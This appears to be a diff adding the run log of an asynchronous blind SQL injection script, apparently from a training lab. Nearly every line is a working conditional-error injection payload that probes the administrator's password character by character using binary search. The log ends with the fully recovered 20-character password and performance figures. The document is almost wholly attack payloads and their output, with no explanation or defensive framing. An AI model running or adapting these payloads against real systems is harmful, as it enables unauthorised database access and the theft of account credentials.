@@ -1,0 +1,182 @@
+Starting get data with binary search and asyncio
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 10, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 13, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 4, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 19, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 12, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 18, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 1, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 16, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 15, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 5, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 7, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 9, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 17, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 14, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 3, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 6, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 20, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 11, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 8, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 16, 1)) = 105 then 0 else 1 end from users where username='administrator')--+
+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 10, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 18, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 1, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(0, 46, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 2, 1)) > 80 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 19, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 17, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 4, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(0, 22, 45) ---> ' and 1=(select 1/case when ascii(substr(password, 5, 1)) > 54 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 7, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 9, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 3, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(0, 22, 45) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 13, 1)) > 54 then 0 else 1 end from users where username='administrator')--+
+(0, 22, 45) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 14, 1)) > 54 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 15, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(0, 22, 45) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 20, 1)) > 54 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 12, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 18, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 1, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 4, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 11, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 6, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 17, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(0, 10, 21) ---> ' and 1=(select 1/case when ascii(substr(password, 14, 1)) > 42 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 3, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 18, 1)) = 111 then 0 else 1 end from users where username='administrator')--+
+
+(47, 58, 69) ---> ' and 1=(select 1/case when ascii(substr(password, 7, 1)) > 92 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 15, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(23, 34, 45) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 5, 1)) > 68 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 19, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 8, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(47, 58, 69) ---> ' and 1=(select 1/case when ascii(substr(password, 9, 1)) > 92 then 0 else 1 end from users where username='administrator')--+
+(47, 70, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 2, 1)) > 105 then 0 else 1 end from users where username='administrator')--+
+(0, 10, 21) ---> ' and 1=(select 1/case when ascii(substr(password, 13, 1)) > 42 then 0 else 1 end from users where username='administrator')--+
+(83, 88, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 1, 1)) > 123 then 0 else 1 end from users where username='administrator')--+
+(83, 88, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 4, 1)) > 123 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> ' and 1=(select 1/case when ascii(substr(password, 12, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 14, 1)) = 48 then 0 else 1 end from users where username='administrator')--+
+
+(71, 76, 81) ---> ' and 1=(select 1/case when ascii(substr(password, 17, 1)) > 111 then 0 else 1 end from users where username='administrator')--+
+(0, 10, 21) ---> ' and 1=(select 1/case when ascii(substr(password, 20, 1)) > 42 then 0 else 1 end from users where username='administrator')--+
+(71, 76, 81) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 3, 1)) > 111 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 1, 1)) = 120 then 0 else 1 end from users where username='administrator')--+
+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 11, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 10, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 6, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(71, 76, 81) ---> ' and 1=(select 1/case when ascii(substr(password, 15, 1)) > 111 then 0 else 1 end from users where username='administrator')--+
+(47, 58, 69) ---> ' and 1=(select 1/case when ascii(substr(password, 2, 1)) > 92 then 0 else 1 end from users where username='administrator')--+
+(23, 28, 33) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 5, 1)) > 61 then 0 else 1 end from users where username='administrator')--+
+(59, 64, 69) ---> ' and 1=(select 1/case when ascii(substr(password, 7, 1)) > 99 then 0 else 1 end from users where username='administrator')--+
+(71, 82, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 8, 1)) > 117 then 0 else 1 end from users where username='administrator')--+
+(71, 76, 81) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 19, 1)) > 111 then 0 else 1 end from users where username='administrator')--+
+(77, 79, 81) ---> ' and 1=(select 1/case when ascii(substr(password, 17, 1)) > 114 then 0 else 1 end from users where username='administrator')--+
+(83, 85, 87) ---> ' and 1=(select 1/case when ascii(substr(password, 4, 1)) > 120 then 0 else 1 end from users where username='administrator')--+
+(71, 76, 81) ---> ' and 1=(select 1/case when ascii(substr(password, 11, 1)) > 111 then 0 else 1 end from users where username='administrator')--+
+(83, 88, 93) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 12, 1)) > 123 then 0 else 1 end from users where username='administrator')--+
+(71, 76, 81) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 6, 1)) > 111 then 0 else 1 end from users where username='administrator')--+
+(71, 73, 75) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 3, 1)) > 108 then 0 else 1 end from users where username='administrator')--+
+(11, 16, 21) ---> ' and 1=(select 1/case when ascii(substr(password, 13, 1)) > 48 then 0 else 1 end from users where username='administrator')--+
+(59, 64, 69) ---> ' and 1=(select 1/case when ascii(substr(password, 9, 1)) > 99 then 0 else 1 end from users where username='administrator')--+
+(71, 76, 81) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 10, 1)) > 111 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 17, 1)) = 115 then 0 else 1 end from users where username='administrator')--+
+
+(65, 67, 69) ---> ' and 1=(select 1/case when ascii(substr(password, 7, 1)) > 102 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 4, 1)) = 121 then 0 else 1 end from users where username='administrator')--+
+
+(71, 76, 81) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 8, 1)) > 111 then 0 else 1 end from users where username='administrator')--+
+(23, 25, 27) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 5, 1)) > 57 then 0 else 1 end from users where username='administrator')--+
+(77, 79, 81) ---> ' and 1=(select 1/case when ascii(substr(password, 15, 1)) > 114 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 9, 1)) = 102 then 0 else 1 end from users where username='administrator')--+
+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 13, 1)) = 51 then 0 else 1 end from users where username='administrator')--+
+
+(71, 73, 75) ---> ' and 1=(select 1/case when ascii(substr(password, 19, 1)) > 108 then 0 else 1 end from users where username='administrator')--+
+(71, 73, 75) ---> ' and 1=(select 1/case when ascii(substr(password, 6, 1)) > 108 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 5, 1)) = 55 then 0 else 1 end from users where username='administrator')--+
+
+(71, 73, 75) ---> ' and 1=(select 1/case when ascii(substr(password, 10, 1)) > 108 then 0 else 1 end from users where username='administrator')--+
+(77, 79, 81) ---> ' and 1=(select 1/case when ascii(substr(password, 11, 1)) > 114 then 0 else 1 end from users where username='administrator')--+
+(71, 73, 75) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 8, 1)) > 108 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 6, 1)) = 109 then 0 else 1 end from users where username='administrator')--+
+
+(83, 85, 87) ---> ' and 1=(select 1/case when ascii(substr(password, 12, 1)) > 120 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 15, 1)) = 115 then 0 else 1 end from users where username='administrator')--+
+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 19, 1)) = 109 then 0 else 1 end from users where username='administrator')--+
+
+(71, 71, 72) ---> ' and 1=(select 1/case when ascii(substr(password, 3, 1)) > 106 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 12, 1)) = 121 then 0 else 1 end from users where username='administrator')--+
+
+(59, 64, 69) ---> OPPOSITE : ' and 1=(select 1/case when ascii(substr(password, 2, 1)) > 99 then 0 else 1 end from users where username='administrator')--+
+(80, 80, 81) ---> ' and 1=(select 1/case when ascii(substr(password, 11, 1)) > 115 then 0 else 1 end from users where username='administrator')--+
+(74, 74, 75) ---> ' and 1=(select 1/case when ascii(substr(password, 10, 1)) > 109 then 0 else 1 end from users where username='administrator')--+
+(68, 68, 69) ---> ' and 1=(select 1/case when ascii(substr(password, 7, 1)) > 103 then 0 else 1 end from users where username='administrator')--+
+(71, 71, 72) ---> ' and 1=(select 1/case when ascii(substr(password, 8, 1)) > 106 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 3, 1)) = 107 then 0 else 1 end from users where username='administrator')--+
+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 11, 1)) = 116 then 0 else 1 end from users where username='administrator')--+
+
+(59, 61, 63) ---> ' and 1=(select 1/case when ascii(substr(password, 2, 1)) > 96 then 0 else 1 end from users where username='administrator')--+
+(11, 16, 21) ---> ' and 1=(select 1/case when ascii(substr(password, 20, 1)) > 48 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 8, 1)) = 107 then 0 else 1 end from users where username='administrator')--+
+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 7, 1)) = 104 then 0 else 1 end from users where username='administrator')--+
+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 2, 1)) = 97 then 0 else 1 end from users where username='administrator')--+
+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 10, 1)) = 110 then 0 else 1 end from users where username='administrator')--+
+
+(17, 19, 21) ---> ' and 1=(select 1/case when ascii(substr(password, 20, 1)) > 51 then 0 else 1 end from users where username='administrator')--+
+(20, 20, 21) ---> ' and 1=(select 1/case when ascii(substr(password, 20, 1)) > 52 then 0 else 1 end from users where username='administrator')--+
+Get the char index successfully ---> ' and 1=(select 1/case when ascii(substr(password, 20, 1)) = 53 then 0 else 1 end from users where username='administrator')--+
+
+Got the password : x, and its length : 1
+
+Got the password : xa, and its length : 2
+
+Got the password : xak, and its length : 3
+
+Got the password : xaky, and its length : 4
+
+Got the password : xaky7, and its length : 5
+
+Got the password : xaky7m, and its length : 6
+
+Got the password : xaky7mh, and its length : 7
+
+Got the password : xaky7mhk, and its length : 8
+
+Got the password : xaky7mhkf, and its length : 9
+
+Got the password : xaky7mhkfn, and its length : 10
+
+Got the password : xaky7mhkfnt, and its length : 11
+
+Got the password : xaky7mhkfnty, and its length : 12
+
+Got the password : xaky7mhkfnty3, and its length : 13
+
+Got the password : xaky7mhkfnty30, and its length : 14
+
+Got the password : xaky7mhkfnty30s, and its length : 15
+
+Got the password : xaky7mhkfnty30si, and its length : 16
+
+Got the password : xaky7mhkfnty30sis, and its length : 17
+
+Got the password : xaky7mhkfnty30siso, and its length : 18
+
+Got the password : xaky7mhkfnty30sisom, and its length : 19
+
+Got the password : xaky7mhkfnty30sisom5, and its length : 20
+
+The final password is : xaky7mhkfnty30sisom5
+Memory usage:            0.477851 MB 
+Peak memory usage:       7.160177 MB
+Finished get data with binary search and asyncio in 57.952635 seconds
+
+🎉
